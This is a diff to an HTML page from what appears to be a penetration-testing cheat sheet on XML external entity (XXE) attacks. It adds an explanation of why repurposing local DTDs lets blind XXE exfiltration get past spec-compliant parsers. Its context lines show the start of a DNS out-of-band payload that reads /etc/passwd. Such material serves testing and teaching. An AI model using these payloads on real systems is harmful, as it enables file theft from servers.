@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=79508bd">
+  <link rel="stylesheet" href="/assets/style.css?v=ac73a26">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1383,7 +1383,7 @@ Content-Type: application/json
 <h1 id="advanced-techniques">Advanced Techniques</h1>
 <p>These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE through PHP expect:// or Java deserialization) which depend on very particular conditions in the target.</p>
 <h2 id="repurposing-local-dtds-blind-xxe">Repurposing Local DTDs (Blind XXE)</h2>
-<p>When OOB connections are blocked and the application only returns errors, we can use pre-existing DTD files on the system to build our exfiltration chain without needing network access.</p>
+<p>When OOB connections are blocked and the application only returns errors, we can use pre-existing DTD files on the system to build our exfiltration chain without needing network access. </p>
 <h3 id="why-enumerate-the-filesystem">Why Enumerate the Filesystem?</h3>
 <p>The goal of enumerating the filesystem is to locate <strong>default DTD files</strong> present on the system. These files can be leveraged to perform advanced XXE attacks because they often:</p>
 <ul>
@@ -1523,6 +1523,10 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <li>The chosen local DTD must allow parameter entity overrides.</li>
 <li>Common candidates: <code>fonts.dtd</code>, <code>docbook.dtd</code>, <code>jspxml.dtd</code></li>
 </ul>
+<h3 id="why-this-technique-works">Why This Technique Works</h3>
+<p>The W3C XML specification forbids parameter entity chaining within the internal DTD subset — this is the restriction that makes the basic error-based payload unreliable in spec-compliant parsers, as explained in the <a href="#error-based-blind-xxe">Error-Based Blind XXE</a> section.</p>
+<p>This technique sidesteps that restriction entirely. Rather than chaining parameter entities inside the internal subset, we use the internal subset only to <strong>redefine</strong> an entity that already exists in the local DTD. Because entity declarations follow a first-definition-wins rule, our override takes effect before the original declaration in the DTD is reached.</p>
+<p>When <code>%local_dtd;</code> is then expanded, execution moves into the external DTD context — where parameter entity chaining is explicitly permitted by the spec. The malicious logic embedded inside <code>%expr</code> executes there, not in the internal subset, which is why spec-compliant parsers do not reject it.</p>
 <h2 id="dns-based-oob-exfiltration">DNS-Based OOB Exfiltration</h2>
 <p>When HTTP/HTTPS connections are blocked by firewall rules, DNS exfiltration provides an alternative. DNS traffic is rarely fully blocked so even if the HTTP request never reaches us, the DNS query still happens when the parser tries to resolve the domain:</p>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
@@ -1856,6 +1860,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=79508bd" defer></script>
+  <script src="/assets/main.js?v=ac73a26" defer></script>
 </body>
 </html>
